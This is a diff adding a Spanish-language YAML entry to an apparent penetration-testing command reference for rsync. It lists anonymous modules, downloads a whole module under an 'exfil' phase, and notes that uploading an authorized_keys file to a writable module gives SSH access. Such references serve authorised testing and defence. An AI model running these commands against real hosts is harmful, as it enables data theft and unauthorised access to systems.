@@ -1,0 +1,26 @@
+# Comandos de rsync: módulos compartidos sin contraseña.
+tool: rsync
+area: recon
+url: https://download.samba.org/pub/rsync/rsync.1
+commands:
+  - id: rsync-list
+    title: Módulos y contenido de un rsync
+    cmd: |
+      rsync --list-only rsync://{{RHOST}}/
+    phase: enum
+    tags: [rsync]
+    notes: >-
+      Sin ruta lista los módulos; con rsync://host/modulo/ lo que hay dentro. Si pide contraseña,
+      el usuario va delante: rsync://usuario@host/modulo/.
+    refs: [https://download.samba.org/pub/rsync/rsync.1]
+
+  - id: rsync-download
+    title: Descargar un módulo de rsync entero
+    cmd: |
+      rsync -av rsync://{{RHOST}}/modulo ./rsync-modulo
+    phase: exfil
+    tags: [rsync]
+    notes: >-
+      Si el módulo es escribible, también funciona al revés: subir un authorized_keys a un módulo que
+      apunte a un home (rsync -av .ssh rsync://host/modulo/) da acceso por SSH.
+    refs: [https://download.samba.org/pub/rsync/rsync.1]
